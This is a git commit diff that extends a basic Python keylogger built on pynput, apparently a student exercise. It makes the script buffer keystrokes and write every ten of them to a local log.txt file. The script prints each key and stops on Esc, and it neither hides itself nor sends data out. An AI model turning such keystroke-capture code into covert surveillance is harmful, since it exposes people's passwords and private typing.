002ba15096a06591a6d0f3b192af6ed473544d5c
Marcos Pais <up201502195@fc.up.pt>
2020-11-04 17:49:07 +0000

    Keylogger V0.2.0

--- Keylogger v2.py
+++ Keylogger v2.py
@@ -4,15 +4,38 @@
 # Further info on the Library: https://pypi.org/project/pynput/
 
 #####################################################################
-# This script capture all the keys sent to the keyboard
+# This script capture all the keys sent to the keyboard 
+# and send them to a log file
 #####################################################################
 
 import pynput
 
 from pynput.keyboard import Key, Listener
 
+count = 0
+keys = []
+
 def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
     print("{0} pressed".format(key)) 
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open ("log.txt", "w" ) as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)    
+
 
 def on_release(key):
     if key == Key.esc:
@@ -20,3 +43,4 @@ def on_release(key):
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
